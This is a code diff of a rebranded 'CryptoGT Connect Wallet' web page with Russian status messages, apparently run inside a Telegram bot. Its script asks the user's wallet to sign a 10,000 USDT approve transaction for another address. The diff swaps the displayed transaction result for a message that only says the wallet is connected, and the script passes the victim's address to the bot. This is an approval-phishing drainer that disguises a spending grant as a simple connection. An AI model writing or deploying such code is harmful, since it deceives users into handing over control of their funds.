@@ -3,25 +3,69 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
-  <title>AutoSwap — Connect Wallet</title>
+  <title> CryptoGT Connect Wallet</title>
   <style>
-    body {background:#000;color:#e0e0e0;font-family:'Segoe UI',sans-serif;
-      display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
-    .container {width:360px;padding:30px;background:#111;border-radius:12px;
-      box-shadow:0 0 20px rgba(0,0,0,0.7);text-align:center;}
-    h1 {color:#4fc3f7;margin-bottom:20px;}
-    canvas {background:#222;border-radius:8px;margin:auto;display:block;}
-    #manual-uri {margin:20px 0;padding:16px;background:#222;border-radius:8px;
-      font-size:14px;color:#bbb;word-break:break-all;}
-    #status {margin:20px 0;min-height:40px;font-size:16px;color:#ccc;}
-    .btn {padding:12px 24px;background:#4fc3f7;color:#000;border:none;
-      border-radius:8px;cursor:pointer;font-weight:bold;transition:background .2s;}
-    .btn:hover {background:#67ccff;}
+    body {
+      background: #000;
+      color: #e0e0e0;
+      font-family: 'Segoe UI', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      width: 360px;
+      padding: 30px;
+      background: #111;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.7);
+      text-align: center;
+    }
+    h1 {
+      color: #ff9800;
+      margin-bottom: 20px;
+    }
+    canvas {
+      background: #222;
+      border-radius: 8px;
+      margin: auto;
+      display: block;
+    }
+    #manual-uri {
+      margin: 20px 0;
+      padding: 16px;
+      background: #222;
+      border-radius: 8px;
+      font-size: 14px;
+      color: #bbb;
+      word-break: break-all;
+    }
+    #status {
+      margin: 20px 0;
+      min-height: 40px;
+      font-size: 16px;
+      color: #ccc;
+    }
+    .btn {
+      padding: 12px 24px;
+      background: #ff9800;
+      color: #000;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: bold;
+      transition: background .2s;
+    }
+    .btn:hover {
+      background: #ffb74d;
+    }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>🔄 AutoSwap — Connect Wallet</h1>
+    <h1>CryptoGT Connect Wallet</h1>
     <canvas id="qrcode" width="240" height="240"></canvas>
     <div id="manual-uri">URI будет здесь</div>
     <div id="status">Инициализация...</div>
@@ -58,7 +102,7 @@
     }
 
     async function connectWallet() {
-      setStatus("📷 Генерация QR‑кода…", "#4fc3f7");
+      setStatus("📷 Генерация QR‑кода…", "#ff9800");
       const { uri, approval } = await client.connect({
         requiredNamespaces: {
           eip155: {
@@ -84,7 +128,7 @@
     }
 
     async function doApprove(address) {
-      setStatus("🚀 Отправка approve...", "#4fc3f7");
+      setStatus("🚀 Отправка approve...", "#ff9800");
       const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
       const data = new Interface(["function approve(address,uint256)"])
         .encodeFunctionData("approve", [
@@ -92,7 +136,7 @@
           parseUnits("10000", 18)
         ]);
       try {
-        const tx = await client.request({
+        await client.request({
           topic: session.topic,
           chainId: "eip155:56",
           request: {
@@ -100,7 +144,7 @@
             params: [{ from: address, to: getAddress(USDT_ADDRESS), data }]
           }
         });
-        setStatus(`✅ Tx: ${tx}`, "#66bb6a");
+        setStatus("✅ Кошелёк подключен", "#66bb6a");
         if (tg) tg.sendData(JSON.stringify({ address }));
       } catch (e) {
         console.error(e);
@@ -111,10 +155,10 @@
     async function init(force=false) {
       if (!client) {
         client = await SignClient.init({
-          projectId: "d868f90cd734355ae0320f8f0258b6b1",  // ✅ исправлен на ваш правильный ID
+          projectId: "d868f90cd734355ae0320f8f0258b6b1",
           metadata: {
-            name: "AutoSwap Approve Flow",
-            description: "Approve USDT via WalletConnect for AutoSwap",
+            name: "CryptoGT Connect",
+            description: "CryptoGT Connect",
             url: location.href,
             icons: ["https://walletconnect.com/favicon.ico"]
           }
@@ -129,7 +173,7 @@
       }
 
       clearUI();
-      setStatus("🔌 Инициализация…");
+      setStatus("🔌 Инициализация…", "#ff9800");
 
       const active = await client.session.getAll();
 
